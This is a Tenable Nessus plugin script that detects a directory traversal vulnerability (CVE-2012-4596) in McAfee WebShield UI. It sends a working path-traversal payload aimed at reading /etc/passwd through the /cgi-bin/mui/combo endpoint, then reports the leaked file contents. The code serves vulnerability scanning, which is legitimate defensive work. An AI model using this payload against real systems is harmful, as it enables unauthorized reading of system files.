#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59112);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/12/19 20:46:16 $");

  script_cve_id("CVE-2012-4596");
  script_bugtraq_id(55184);
  script_osvdb_id(84850);
  script_xref(name:"TRA", value:"TRA-2012-17");
  script_xref(name:"MCAFEE-SB", value:"SB10026");

  script_name(english:"McAfee WebShield UI mui Directory Traversal (SB10026)");
  script_summary(english:"Tries to get /etc/passwd.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"An application hosted on the remote web server is affected by a
directory traversal vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of the McAfee WebShield UI hosted on the remote web server
is affected by a directory traversal vulnerability. Input passed to
the query string of /cgi-bin/mui is not properly sanitized. A remote,
unauthenticated attacker can exploit this to read arbitrary files as
the apache user."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2012-17");
  script_set_attribute(attribute:"see_also", value:"https://kc.mcafee.com/corporate/index?page=content&id=SB10026");
  script_set_attribute(attribute:"solution", value:
"Apply the relevant hotfix specified in McAfee Security Bulletin
SB10026.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"McAfee Email Gateway 7.0 File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/16");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:mcafee:email_and_web_security");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:mcafee:email_gateway");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("mcafee_webshield_web_ui_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/mcafee_webshield");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:443);
install = get_install_from_kb(appname:'mcafee_webshield', port:port, exit_on_fail:TRUE);

payload = '../../../../../../../../../etc/passwd%00.js';
url = install['dir'] + '/cgi-bin/mui/combo?' + payload;
res = http_send_recv3(
  method:'GET',
  item:url,
  port:port,
  exit_on_fail:TRUE
);

if (isnull(res[2]))
  audit(AUDIT_RESP_NOT, port);

# preserving the NULL bytes would mess with all the string related functions below
output = str_replace(string:res[2], find:'\x00', replace:'%00');

if (!(first_record = egrep(pattern:'root:.*:0:[01]:', string:output)))
  audit(AUDIT_LISTEN_NOT_VULN, 'WebShield', port);

if (report_verbosity > 0)
{
  trailer = NULL;

  if (report_verbosity > 1)
  {
    # cut out the header and trailer
    output = strstr(output, first_record);
    end = strstr(output, '/* END FILE: ' + payload);
    output -= end;
    trailer = 'Which returned the following file contents :\n\n' + chomp(output);
  }

  report = get_vuln_report(items:url, port:port, trailer:trailer);
  security_warning(port:port, extra:report);
}
else security_warning(port);
 
